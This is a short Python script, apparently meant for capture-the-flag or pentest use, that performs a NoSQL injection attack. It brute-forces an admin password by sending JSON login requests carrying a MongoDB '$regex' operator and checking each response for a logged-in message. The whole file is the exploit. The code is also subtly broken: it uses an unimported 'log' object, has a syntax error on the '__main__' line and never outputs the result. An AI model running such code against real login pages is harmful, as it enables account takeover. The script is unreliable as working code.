import requests,time,sys,signal,string

def def_handler(sig,frame):
    print("\n\n [!]Exit... ")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT,def_handler)

#Variables Globales

login_url = "http://..." #Edit
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNoSQLI():
    
    password=""

    p1 = log.progress("Brute force")
    p1.status("Init process ...")

    for position in range(1,24):
        for character in characters:
            post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' %(password,character)
            headers={'Content-Type': 'application/json'}
            r = requests.post(login_url,headers=headers,data=post_data)

            if "Logged in as user" in r.text:
                password += character
                break

if __name__ =='__main__'
    makeNoSQLI()